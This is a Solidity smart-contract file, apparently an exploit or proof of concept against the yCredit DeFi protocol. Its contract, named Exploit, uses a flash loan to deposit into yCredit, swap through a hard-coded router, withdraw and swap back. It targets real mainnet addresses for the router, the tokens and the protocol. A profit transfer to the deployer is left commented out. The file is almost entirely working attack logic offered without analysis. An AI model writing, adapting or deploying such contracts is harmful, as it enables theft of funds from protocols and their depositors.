pragma solidity ^0.7.5;

import { FlashLoanReceiverBase } from "./FlashLoanReceiverBase.sol";
import { IFlashLoanReceiver } from './IFlashLoanReceiver.sol';
import { ILendingPool } from "./ILendingPool.sol";
import { ILendingPoolAddressesProvider } from "./ILendingPoolAddressesProvider.sol";
import { IERC20 } from "./IERC20.sol";

interface yCredit {
    function deposit(address token, uint amount) external;
    function withdraw(address token, uint amount) external;
}

interface Router {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

contract Exploit is FlashLoanReceiverBase{
    address immutable dev;
    Router constant router = Router(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
    address constant factory = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address constant ycredit = 0xE0839f9b9688a77924208aD509e29952dc660261;
    // address constant LENDING_POOL = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;
    address constant dai = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant usdt = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    constructor(address _addressProvider) public FlashLoanReceiverBase(ILendingPoolAddressesProvider(_addressProvider))
    {
        dev = msg.sender;
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    )
        public
        override
        returns (bool)
    {
        address[] memory path = new address[](2);
        for (uint i = 0; i < assets.length; i++) {
            // 1. deposit asset to ycredit
            IERC20(assets[i]).approve(ycredit, amounts[i] / 2);
            yCredit(ycredit).deposit(assets[i], amounts[i] / 2);
            // 2. swap to ycredit
            path[0] = assets[i];
            path[1] = ycredit;
            IERC20(assets[i]).approve(address(router), amounts[i] / 2);
            router.swapExactTokensForTokens(amounts[i] / 2, 0, path, address(this), block.timestamp);
            // 3. withdraw from ycredit
            yCredit(ycredit).withdraw(assets[i], IERC20(ycredit).balanceOf(address(this)));
            // 4. swap ycredit to asset
            path[0] = ycredit;
            path[1] = assets[i];
            uint amountIn = IERC20(ycredit).balanceOf(address(this));
            IERC20(ycredit).approve(address(router), amountIn);
            router.swapExactTokensForTokens(amountIn, 0, path, address(this), block.timestamp);
            // 5. return the profits
            // uint profit = IERC20(assets[i]).balanceOf(address(this)) - amounts[i] - premiums[i];
            // IERC20(assets[i]).transfer(dev, profit);
            // 6. return the flash loan
            IERC20(assets[i]).approve(address(LENDING_POOL), amounts[i] + 10*premiums[i]);
        }
        return true;
    }

    function myFlashLoanCall(address[] memory assets, uint[] memory amounts, uint[] memory modes) public {
        address receiverAddress = address(this);
        address onBehalfOf = address(this);
        bytes memory params = "";
        uint16 referralCode = 0;
        ILendingPool(LENDING_POOL).flashLoan(
            receiverAddress,
            assets,
            amounts,
            modes,
            onBehalfOf,
            params,
            referralCode
        );
    }
}
